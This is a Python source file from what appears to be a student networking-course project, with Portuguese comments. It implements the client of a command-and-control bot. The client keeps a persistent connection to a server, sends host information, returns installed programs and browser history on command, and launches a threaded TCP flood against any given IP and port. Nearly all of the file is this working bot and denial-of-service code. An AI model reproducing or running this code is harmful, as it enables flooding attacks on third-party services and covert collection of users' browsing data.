#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# ifrn/2023.2/programacao_para_redes/projeto/funcoes_cliente.py
# Copyright (C) 2023-2024  Sidney Pedro
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

# Importando bibliotecas
from constantes import *
import funcoes, socket, time, threading

# Função para parar o cliente
def parar_cliente():
    global continuar
    continuar = False

    print(f"\nEncerrando cliente em {TIMEOUT} segundos...")
    return

# Função para negar serviço em um alvo
def negar_servico(sock: str):
    global negacoes

    # Montando tupla com IP e porta informados
    socket_tupla = (sock.split(':')[0], int(sock.split(':')[1]))

    if (not sock in negacoes):
        return

    while (continuar and negacoes[sock]):
        # Criando socket TCP
        alvo_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Conectando socket
        status_conexao = alvo_sock.connect_ex(socket_tupla)
        if (status_conexao != 0):
            alvo_sock.close()
            continue

        # Inundando dados
        try:
            alvo_sock.send(('A' * 4096).encode(CHARSET))
            alvo_sock.close()
        except:
            alvo_sock.close()
            continue

    negacoes.pop(sock)
    return

# Função para configurar pedido de Negação de Serviço
def analisar_negacao(mensagem: str):
    global negacoes

    mensagem = mensagem.split()
    acao = mensagem[0]
    sock = mensagem[1]

    if (acao == "iniciar"):
        negacoes[sock] = True
        thread = threading.Thread(target=negar_servico, args=(sock,))
        thread.start()
    elif (acao == "parar" and sock in negacoes):
        negacoes[sock] = False

    return

# Função para gerenciar conexão com servidor
def realizar_conexao():
    global continuar, negacoes
    negacoes = {}

    # Criando socket TCP
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Conectando socket
    status_conexao = server_sock.connect_ex(SOCKET_SERVIDOR)
    if (status_conexao != 0):
        server_sock.close()
        return

    # Enviando informações do cliente
    try:
        server_sock.send(funcoes.obter_informacoes().encode(CHARSET))
    except:
        return

    print("Conexão estabelecida com o servidor!")

    while (continuar):
        # Tentando receber mensagem do servidor
        try:
            mensagem_recebida = server_sock.recv(TAMANHO_BUFFER).decode(CHARSET)
        except KeyboardInterrupt:
            parar_cliente()
            continue
        except:
            print("Conexão perdida com o servidor!")
            break

        # Se o tamanho da mensagem recebida for menor que 1,
        # informa-se desconexão com servidor
        if (len(mensagem_recebida) < 1):
            print("Conexão perdida com o servidor!")
            break

        # Analisando mensagem do servidor e preparando resposta
        if (mensagem_recebida == "alive?"):
            mensagem_retorno = "alive!".encode(CHARSET)
        elif ("./c2 -p" in mensagem_recebida):
            mensagem_retorno = funcoes.obter_programas().encode(CHARSET)
        elif ("./c2 -b" in mensagem_recebida):
            mensagem_retorno = funcoes.obter_historico().encode(CHARSET)
        elif ("./c2 -q" in mensagem_recebida):
            mensagem_retorno = f"Encerrando cliente em {TIMEOUT} segundos...".encode(CHARSET)
            parar_cliente()
        elif ("./c2 -n " in mensagem_recebida):
            analisar_negacao(mensagem_recebida[8:])
            continue
        else:
            mensagem_retorno = ("Devolvendo mensagem: " + mensagem_recebida).encode(CHARSET)

        # Tentando devolver mensagem ao servidor
        try:
            server_sock.send(mensagem_retorno)
        except:
            break

    # Finalizando socket
    server_sock.close()
    return

# Função principal do cliente
def cliente():
    global continuar
    continuar = True

    print("Para encerrar o cliente, pressione Ctrl-c\n")

    # Mantendo conexão persistente até que o cliente seja encerrado
    while (continuar):
        realizar_conexao()
        try:
            time.sleep(TIMEOUT)
        except KeyboardInterrupt:
            continuar = False
            print()

    return
